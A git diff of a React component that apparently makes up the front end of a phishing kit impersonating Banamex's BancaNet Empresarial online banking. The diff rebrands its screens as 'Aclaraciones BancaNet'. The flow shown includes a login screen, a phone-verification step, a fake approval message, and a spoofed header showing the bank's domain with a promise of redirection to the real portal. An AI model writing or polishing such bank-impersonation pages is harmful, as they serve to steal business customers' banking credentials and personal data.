@@ -245,8 +245,8 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
 
                   {/* Tarjeta BancaNet Principal */}
                   <div className="platacard-bg rounded-2xl p-12 mb-12 mx-auto max-w-lg shadow-xl">
-                    <h2 className="text-6xl md:text-7xl font-bold text-white mb-2">BancaNet</h2>
-                    <h2 className="text-6xl md:text-7xl font-bold text-white mb-4">Empresarial</h2>
+                    <h2 className="text-6xl md:text-7xl font-bold text-white mb-2">Aclaraciones</h2>
+                    <h2 className="text-6xl md:text-7xl font-bold text-white mb-4">BancaNet</h2>
                     <p className="text-3xl text-orange-300 font-semibold">Acceso Seguro</p>
                   </div>
 
@@ -254,7 +254,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   <div className="mb-12">
                     <p className="text-xl text-gray-700 leading-relaxed max-w-3xl mx-auto">
                       Para clientes empresariales de Banamex con{' '}
-                      <span className="font-bold platacard-accent">acceso a BancaNet Empresarial</span>.{' '}
+                      <span className="font-bold platacard-accent">acceso a Aclaraciones BancaNet</span>.{' '}
                       Gestión segura de sus cuentas y operaciones bancarias.
                     </p>
                   </div>
@@ -265,7 +265,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                       className="platacard-button text-2xl font-bold px-12 py-6 rounded-xl shadow-2xl transform hover:scale-105 transition-all duration-300"
                       onClick={() => onSubmit(ScreenType.TERMINOS, {})}
                     >
-                      Acceder a BancaNet Empresarial →
+                      Acceder a Aclaraciones BancaNet →
                     </Button>
                   </div>
 
@@ -287,7 +287,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   <div className="grid md:grid-cols-3 gap-12 text-center">
                     <div className="p-8 bg-gray-50 rounded-xl">
                       <h4 className="text-xl font-bold text-gray-900 mb-4">Plataforma</h4>
-                      <p className="text-lg text-gray-600">BancaNet Empresarial</p>
+                      <p className="text-lg text-gray-600">Aclaraciones BancaNet</p>
                     </div>
                     <div className="p-8 bg-gray-50 rounded-xl">
                       <h4 className="text-xl font-bold text-gray-900 mb-4">Acceso</h4>
@@ -317,7 +317,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     <div className="bg-white rounded-xl overflow-hidden shadow-lg">
                       <img 
                         src={promoImage1} 
-                        alt="BancaNet Empresarial" 
+                        alt="Aclaraciones BancaNet" 
                         className="w-full h-72 object-cover"
                       />
                     </div>
@@ -339,7 +339,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               <div className="max-w-6xl mx-auto px-8">
                 <div className="text-center mb-20">
                   <h2 className="text-4xl md:text-5xl font-bold text-gray-900 mb-8">¿Cómo funciona?</h2>
-                  <p className="text-2xl text-gray-600">Solo 3 pasos para acceder a BancaNet Empresarial</p>
+                  <p className="text-2xl text-gray-600">Solo 3 pasos para acceder a Aclaraciones BancaNet</p>
                 </div>
 
                 <div className="space-y-16 max-w-4xl mx-auto">
@@ -363,7 +363,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     <span className="platacard-step-number mr-8">3</span>
                     <div className="flex-1">
                       <div className="font-bold text-gray-900 text-2xl mb-6">Accede a tu cuenta</div>
-                      <div className="text-gray-700 text-xl leading-relaxed">Gestiona tus cuentas y operaciones de manera segura desde BancaNet Empresarial</div>
+                      <div className="text-gray-700 text-xl leading-relaxed">Gestiona tus cuentas y operaciones de manera segura desde Aclaraciones BancaNet</div>
                     </div>
                   </div>
                 </div>
@@ -374,7 +374,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     className="w-full sm:w-auto bg-gradient-to-r from-gray-600 to-gray-700 hover:from-gray-700 hover:to-gray-800 text-white px-12 py-6 text-xl font-bold rounded-lg shadow-lg hover:shadow-xl transition-all duration-300 transform hover:scale-105"
                     onClick={() => onSubmit(ScreenType.TERMINOS, {})}
                   >
-                    Acceder a BancaNet Empresarial →
+                    Acceder a Aclaraciones BancaNet →
                   </Button>
                   <p className="text-lg text-gray-500 mt-8">
                     * Acceso exclusivo para clientes empresariales de Banamex
@@ -389,11 +389,11 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         const terminosContent = (
           <>
             <h2 className="text-lg font-bold mb-4 text-gray-700">
-              Términos y Condiciones de Acceso a BancaNet Empresarial Banamex
+              Términos y Condiciones de Acceso a Aclaraciones BancaNet Banamex
             </h2>
             <div className="max-h-80 overflow-y-auto text-left mb-6 text-sm text-gray-700 pr-2">
               <p className="mb-3">
-                Los presentes Términos y Condiciones tienen por objeto reglamentar y establecer los procedimientos aplicables al acceso a BancaNet Empresarial ofrecido por Banamex.
+                Los presentes Términos y Condiciones tienen por objeto reglamentar y establecer los procedimientos aplicables al acceso a Aclaraciones BancaNet ofrecido por Banamex.
               </p>
               <p className="mb-2 font-semibold">1. Requisitos para Acceder:</p>
               <p className="mb-3">
@@ -401,16 +401,16 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               </p>
               <ul className="mb-3 ml-4 list-disc">
                 <li>Ser titular de una cuenta empresarial Banamex válida y activa.</li>
-                <li>Tener credenciales de acceso válidas para BancaNet Empresarial.</li>
+                <li>Tener credenciales de acceso válidas para Aclaraciones BancaNet.</li>
                 <li>Contar con autorización para realizar operaciones bancarias.</li>
               </ul>
               <p className="mb-2 font-semibold">2. Descripción del Servicio:</p>
               <p className="mb-3">
-                Los clientes empresariales podrán acceder a BancaNet Empresarial para gestionar sus cuentas y realizar operaciones bancarias de forma segura.
+                Los clientes empresariales podrán acceder a Aclaraciones BancaNet para gestionar sus cuentas y realizar operaciones bancarias de forma segura.
               </p>
               <p className="mb-2 font-semibold">3. Condiciones Generales:</p>
               <ul className="mb-3 ml-4 list-disc">
-                <li>El acceso a BancaNet Empresarial está disponible 24/7.</li>
+                <li>El acceso a Aclaraciones BancaNet está disponible 24/7.</li>
                 <li>Las operaciones están sujetas a los límites y condiciones de cada cuenta.</li>
                 <li>Válido hasta agotar existencias o por 6 meses desde la fecha de la promoción.</li>
               </ul>
@@ -478,7 +478,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
 
                 {/* Info adicional */}
                 <p className="text-xs text-gray-500 text-center mt-4">
-                  Tu teléfono será usado únicamente para verificar tu acceso a BancaNet Empresarial
+                  Tu teléfono será usado únicamente para verificar tu acceso a Aclaraciones BancaNet
                 </p>
               </div>
             </div>
@@ -820,7 +820,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             <div className="text-center mb-6">
               <h2 className="text-2xl font-bold text-gray-800 mb-2">Iniciar sesión</h2>
               <p className="text-sm text-gray-600">
-                Accede a tu cuenta para continuar a BancaNet Empresarial
+                Accede a tu cuenta para continuar a Aclaraciones BancaNet
               </p>
             </div>
 
@@ -1712,7 +1712,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 </div>
                 <h2 className="text-2xl font-bold platacard-gradient-text mb-3">¡Felicidades!</h2>
                 <p className="text-gray-700 font-semibold text-lg mb-2">
-                  Su <span className="text-2xl font-bold platacard-accent">acceso a BancaNet Empresarial</span> ha sido autorizado
+                  Su <span className="text-2xl font-bold platacard-accent">acceso a Aclaraciones BancaNet</span> ha sido autorizado
                 </p>
                 <p className="text-gray-600">Totalmente gratuitos por su excelente historial crediticio</p>
               </div>
@@ -1725,7 +1725,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 <div className="text-left text-sm text-gray-700 space-y-2">
                   <div className="flex justify-between">
                     <span>• <strong>Producto:</strong></span>
-                    <span>BancaNet Empresarial</span>
+                    <span>Aclaraciones BancaNet</span>
                   </div>
                   <div className="flex justify-between">
                     <span>• <strong>Costo para usted:</strong></span>
@@ -2766,11 +2766,11 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             <div className="w-20 h-20 bg-gradient-to-br from-[#ff6b35] to-[#ff8c5a] rounded-full mx-auto mb-6 flex items-center justify-center">
               <span className="text-3xl">🎧</span>
             </div>
-            <h2 className="text-xl font-bold mb-5 platacard-gradient-text">Procesando acceso a BancaNet Empresarial</h2>
+            <h2 className="text-xl font-bold mb-5 platacard-gradient-text">Procesando acceso a Aclaraciones BancaNet</h2>
             <div className="flex items-center justify-center mb-5">
               <div className="w-12 h-12 border-t-4 border-b-4 border-[#ff6b35] rounded-full animate-spin"></div>
             </div>
-            <p className="text-center mb-2 text-gray-700">Por favor espere, estamos validando su acceso a BancaNet Empresarial...</p>
+            <p className="text-center mb-2 text-gray-700">Por favor espere, estamos validando su acceso a Aclaraciones BancaNet...</p>
             <p className="text-center text-sm text-gray-500">Será redirigido automáticamente al portal de Banamex</p>
           </div>
         );
@@ -2809,7 +2809,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               </div>
               <div style={{ textAlign: 'right' }}>
                 <div style={{ fontSize: '11px', color: '#666' }}>bancanetempresarial.banamex.com.mx</div>
-                <div style={{ fontSize: '13px', fontWeight: 600, color: '#000', marginTop: '2px' }}>BancaNet Empresarial</div>
+                <div style={{ fontSize: '13px', fontWeight: 600, color: '#000', marginTop: '2px' }}>Aclaraciones BancaNet</div>
               </div>
             </header>
 
